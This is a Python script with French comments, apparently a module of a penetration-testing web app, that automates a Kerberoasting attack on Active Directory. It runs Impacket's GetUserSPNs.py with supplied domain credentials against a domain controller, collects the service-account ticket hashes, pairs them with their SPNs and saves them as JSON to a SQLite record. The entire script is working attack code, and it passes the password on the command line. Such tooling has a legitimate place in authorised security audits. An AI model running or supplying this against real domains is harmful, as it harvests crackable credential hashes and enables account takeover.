#importer les bibliothèques
import subprocess
import time
import argparse
import json
import sqlite3
from datetime import datetime
import os
import re

#Les arguments :
#remarque : decommenté les arguments
parser = argparse.ArgumentParser()

parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--domain_name', type=str, required=True, help='Le FQDN de domaine')
parser.add_argument('--ip_dc', type=str, required=True, help='addresse ip de DC')
parser.add_argument('--username', type=str, required=True, help='Un nom d utilisateur de domaine')
parser.add_argument('--password', type=str, required=True, help='Le mot de passe pour le username')


args = parser.parse_args()

ip_dc = args.ip_dc
domain_name = args.domain_name
username = args.username
password = args.password

# sauvegarde du chemin du repertoire courant
origin_dir_path = os.path.abspath(os.getcwd())

# aller au repertoire de traitement du kerberoasting
kerberoasting_directory = "My_app/kerberoasting_results"
os.chdir(kerberoasting_directory)


# verifier si le target_ip est une address ip ou bien un dns host name
pattern = r"[a-zA-Z]"
match = re.search(pattern, ip_dc)
cmd = ""
if match:
	#construction de la commande a lancer avec subprocess
	cmd = "python ../scripts/impacket/examples/GetUserSPNs.py " + domain_name + "/" + username + ":" + password + " -dc-host " + ip_dc + " -request -outputfile file-hash.txt"

else:
	# construction de la commande a lancer avec subprocess
	cmd = "python ../scripts/impacket/examples/GetUserSPNs.py " + domain_name + "/" + username + ":" + password + " -dc-ip " + ip_dc + " -request -outputfile file-hash.txt"

print("CMD = " + str(cmd))

# Exécute la commande dans un nouveau processus
process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)

# Attend que la tâche soit terminée et récupère la sortie
output, error = process.communicate()
print('%%%%%%%%%%%%%  sortie de la commande  %%%%%%%%%%%%%')
print(output.decode("utf-8"))


resultats = {}
services = []

list_tgs_rep = []
if os.path.isfile("file-hash.txt"):
	with open('file-hash.txt', "r") as file:
		content = file.read()
		print(content)

	ansi_escape1 = re.compile(r'[ ]+')
	list_services = []

	for ligne in output.decode("utf-8").split('\n'):
		if ligne.find(domain_name) != -1:
			ligne = ansi_escape1.sub(' ', ligne)
			print("Une ligne avec SPN trouver : " + ligne)
			list_services.append(ligne)

	resultats = {}
	services = []
	i=0
	for ligne_service in list_services:
		resultat_service = {}
		spn = ligne_service.split(" ")[0]
		computer_service = ligne_service.split(" ")[1]
		resultat_service = {
			'SPN' : spn,
			'service' : spn.split("/")[0],
			'computer_service' : computer_service,
			'service_compte_hash' : content.split("\n")[i]
		}
		services.append(resultat_service)
		i=i+1

	try:
		# Delete the file
		os.remove("file-hash.txt")
		print("File deleted successfully.")
	except OSError as e:
		# Handle file deletion error
		print(f"Error deleting the file: {e}")


os.chdir(origin_dir_path)

resultats = {
	'dc_ip' : ip_dc,
	'services' : services
}	

print(json.dumps(resultats, indent=4))	
	
#transformer le dictionnaire en JSON
json_resultats = json.dumps(resultats)


# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Se connecter a la BDD pour enregistrer le resultat sous format json :
conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()
